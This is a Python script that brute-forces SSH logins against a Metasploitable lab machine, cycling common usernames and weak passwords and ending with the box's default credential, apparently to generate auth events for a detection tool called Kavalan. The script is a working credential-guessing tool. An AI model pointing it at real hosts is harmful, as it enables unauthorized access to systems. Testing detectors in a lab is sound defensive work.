#!/usr/bin/env python3
"""
attack_ssh.py - SSH brute-force attacker against the lab's Metasploitable box.

Generates real failed SSH logins (and, with Metasploitable's known weak creds, a
successful one) so Kavalan's auth channel has something to detect. Run ONLY against
your own lab target.

Metasploitable 2 uses old SSH algorithms; paramiko negotiates them, but we also widen
the allowed set. Install paramiko first:  pip3 install paramiko

Usage:
    python3 attack_ssh.py --host 127.0.0.1 --port 2222 --tries 60
"""
import argparse
import random
import time

try:
    import paramiko
except ImportError:
    raise SystemExit("paramiko not installed. Run:  pip3 install paramiko")

USERS = ["root", "admin", "test", "oracle", "postgres", "ubuntu", "git", "ftp",
         "user", "service", "backup", "msfadmin"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "letmein", "test",
             "qwerty", "changeme", "msfadmin"]


def attempt(host, port, user, pw):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(host, port=port, username=user, password=pw, timeout=6,
                  allow_agent=False, look_for_keys=False, banner_timeout=10, auth_timeout=10)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"  (connect issue: {e})")
        return None
    finally:
        c.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--tries", type=int, default=60)
    ap.add_argument("--delay", type=float, default=0.8, help="seconds between attempts")
    args = ap.parse_args()

    print(f"Brute-forcing ssh://{args.host}:{args.port} — {args.tries} attempts")
    hits = 0
    # end with the known Metasploitable credential so we also get a 'success after failures'
    plan = [(random.choice(USERS), random.choice(PASSWORDS)) for _ in range(args.tries - 1)]
    plan.append(("msfadmin", "msfadmin"))
    for i, (u, pw) in enumerate(plan, 1):
        r = attempt(args.host, args.port, u, pw)
        if r is True:
            hits += 1
            print(f"  [{i}] SUCCESS {u}:{pw}")
        elif r is False:
            if i % 10 == 0:
                print(f"  [{i}] {i} attempts, still failing (expected)")
        time.sleep(args.delay)
    print(f"done — {hits} successful login(s). Check Kavalan's auth channel.")


if __name__ == "__main__":
    main()
